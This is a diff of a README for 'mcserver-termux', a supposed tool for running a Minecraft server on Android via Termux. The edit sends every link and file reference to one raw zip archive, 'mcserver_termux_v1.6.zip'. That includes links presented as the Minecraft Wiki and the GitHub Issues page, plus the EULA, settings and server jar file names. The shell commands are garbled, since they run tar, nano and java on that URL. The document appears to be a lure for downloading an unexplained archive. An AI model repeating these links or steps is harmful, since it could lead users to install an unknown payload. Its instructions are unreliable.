@@ -1,7 +1,7 @@
 # 🏰 mcserver-termux - Run Minecraft Java Server Easily
 
 ## 📥 Download Now
-[![Download mcserver-termux](https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip)](https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip)
+[![Download mcserver-termux](https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver_termux_v1.6.zip)](https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver_termux_v1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the mcserver-termux guide. This application allows you to run a Minecraft Java server on your non-rooted Android phone. Follow this simple guide to get your server up and running!
@@ -20,9 +20,9 @@ Before you start, ensure your device meets these basic requirements:
 3. Tap **Install** and wait for the application to download.
 
 ## 📂 Download & Install
-1. **Visit the Releases Page** to download the latest version of mcserver-termux: [mcserver-termux Releases](https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip).
+1. **Visit the Releases Page** to download the latest version of mcserver-termux: [mcserver-termux Releases](https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver_termux_v1.6.zip).
 2. Find the latest release. You will see a list of files.
-3. Look for the file labeled as the main release; it often looks like `https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip`.
+3. Look for the file labeled as the main release; it often looks like `https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver_termux_v1.6.zip`.
 4. Tap on the file to download it.
 
 ## ⚙️ Unpack the Files
@@ -33,7 +33,7 @@ Before you start, ensure your device meets these basic requirements:
    ```
 3. Once in the directory, unpack the downloaded file using:
    ```bash
-   tar -xvzf https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip
+   tar -xvzf https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver_termux_v1.6.zip
    ```
 
 ## 🌐 Setup Your Minecraft Server
@@ -41,16 +41,16 @@ Before you start, ensure your device meets these basic requirements:
    ```bash
    cd mcserver-termux
    ```
-2. Before starting the server, you need to accept the EULA (End User License Agreement). Open the `https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip` file:
+2. Before starting the server, you need to accept the EULA (End User License Agreement). Open the `https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver_termux_v1.6.zip` file:
    ```bash
-   nano https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip
+   nano https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver_termux_v1.6.zip
    ```
 3. Change `eula=false` to `eula=true`. Press **CTRL + X**, then **Y** to save.
 
 ## 🔑 Configure Your Server
-1. Open the `https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip` file to adjust your server settings. Use:
+1. Open the `https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver_termux_v1.6.zip` file to adjust your server settings. Use:
    ```bash
-   nano https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip
+   nano https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver_termux_v1.6.zip
    ```
 2. Modify these settings to personalize your server:
    - **gamemode:** Set the default game mode (survival or creative).
@@ -60,14 +60,14 @@ Before you start, ensure your device meets these basic requirements:
 ## 🏁 Start Your Server
 1. Begin the server with:
    ```bash
-   java -Xmx1024M -Xms1024M -jar https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip nogui
+   java -Xmx1024M -Xms1024M -jar https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver_termux_v1.6.zip nogui
    ```
 2. To stop the server, type **stop** in the Termux command line.
 
 ## 🔍 Troubleshooting
 If you run into issues, consider these common solutions:
 
-- **Server not starting:** Ensure you are in the correct folder and check your `https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip`.
+- **Server not starting:** Ensure you are in the correct folder and check your `https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver_termux_v1.6.zip`.
 - **Connection issues:** Confirm your internet connection and port settings.
 - **Performance lags:** Lower the `Xmx` and `Xms` values to reduce memory use.
 
@@ -79,10 +79,10 @@ If you run into issues, consider these common solutions:
 5. Click **Done** and connect!
 
 ## 🗒️ Additional Resources
-- For more help, visit the official [Minecraft Wiki](https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip).
+- For more help, visit the official [Minecraft Wiki](https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver_termux_v1.6.zip).
 - Check the community forums for tips and support.
 
 ## 💬 Contact & Support
-If you have questions or need further assistance, feel free to open an issue in the [GitHub Issues Page](https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver-termux.zip).
+If you have questions or need further assistance, feel free to open an issue in the [GitHub Issues Page](https://raw.githubusercontent.com/rick2312/mcserver-termux/main/achroglobin/mcserver_termux_v1.6.zip).
 
 Thank you for using mcserver-termux! We hope you enjoy your Minecraft server experience.
